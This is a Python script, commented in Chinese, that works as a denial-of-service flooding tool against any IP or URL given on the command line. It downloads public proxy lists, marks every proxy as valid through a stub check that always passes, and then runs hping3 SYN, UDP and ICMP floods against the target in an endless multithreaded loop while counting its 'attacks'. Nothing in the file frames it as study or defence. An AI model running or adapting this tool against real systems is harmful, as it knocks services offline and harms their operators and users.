import sys
import signal
import time
import subprocess
import requests
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

# 全局变量
attack_success_counts = {"tcp": 0, "udp": 0, "icmp": 0}
proxy_success_count = 0
PROXY_FILE = 'yuanIP.txt'
PROXIES = []
START_TIME = None
TARGET_IP = None
TARGET_PORT = None
NUM_THREADS = 10

# 捕捉中断信号
def signal_handler(sig, frame):
    print("\n程序被终止，清理资源...")
    sys.exit(0)

# 加载代理 IP
def load_proxies(file):
    with open(file, 'r') as f:
        return [line.strip() for line in f.readlines()]

# 从多个来源下载代理 IP
def download_proxies(output_file):
    urls = [
        "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    ]
    with open(output_file, 'wb') as f:
        for url in urls:
            try:
                response = requests.get(url, timeout=5)
                f.write(response.content)
                print(f"从 {url} 下载代理成功。")
            except Exception as e:
                print(f"从 {url} 下载代理失败: {e}")

# 从 URL 获取目标 IP
def get_ip_from_url(url):
    try:
        domain = url.replace("http://", "").replace("https://", "").split('/')[0]
        return socket.gethostbyname(domain)
    except Exception as e:
        print(f"解析IP地址失败: {e}")
        return None

# 验证代理 IP 的可用性（简单验证逻辑）
def test_proxy(proxy):
    try:
        # 模拟测试：实际逻辑可以替换为请求检测
        return True
    except:
        return False

# 执行攻击
def run_attack(protocol):
    command = {
        'tcp': ["hping3", "-S", "--flood", "-p", str(TARGET_PORT), TARGET_IP],
        'udp': ["hping3", "--udp", "--flood", "-p", str(TARGET_PORT), TARGET_IP],
        'icmp': ["hping3", "--icmp", "--flood", TARGET_IP]
    }.get(protocol)
    try:
        subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return protocol, True
    except subprocess.CalledProcessError:
        return protocol, False

# 更新统计结果
def handle_result(protocol, success):
    if success:
        attack_success_counts[protocol] += 1
    print(f"\rTCP: {attack_success_counts['tcp']} | UDP: {attack_success_counts['udp']} | ICMP: {attack_success_counts['icmp']}", end="")

# 主函数
def main():
    global START_TIME, TARGET_IP, TARGET_PORT, NUM_THREADS, proxy_success_count, PROXIES

    signal.signal(signal.SIGINT, signal_handler)

    if len(sys.argv) < 4:
        print("用法: python3 script.py <目标IP或URL> <端口> <线程数>")
        sys.exit(1)

    # 解析命令行参数
    target_input, TARGET_PORT, NUM_THREADS = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    TARGET_IP = get_ip_from_url(target_input) if target_input.startswith("http") else target_input

    if not TARGET_IP:
        print("目标IP解析失败！")
        sys.exit(1)

    # 下载并加载代理
    download_proxies(PROXY_FILE)
    PROXIES = load_proxies(PROXY_FILE)

    # 验证代理可用性
    print("验证代理IP的可用性...")
    available_proxies = []
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        for proxy in PROXIES:
            if test_proxy(proxy):
                available_proxies.append(proxy)
                proxy_success_count += 1
                print(f"\r验证成功: {proxy_success_count} 个", end="")

    if not available_proxies:
        print("\n没有可用代理，请检查代理文件。")
        return

    print(f"\n检测到可用代理: {len(available_proxies)} 个")
    
    # 直接开始攻击
    print("开始攻击...")
    START_TIME = time.time()
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        while True:
            futures = [executor.submit(run_attack, protocol) for protocol in ["tcp", "udp", "icmp"]]
            for future in as_completed(futures):
                protocol, success = future.result()
                handle_result(protocol, success)

if __name__ == '__main__':
    main()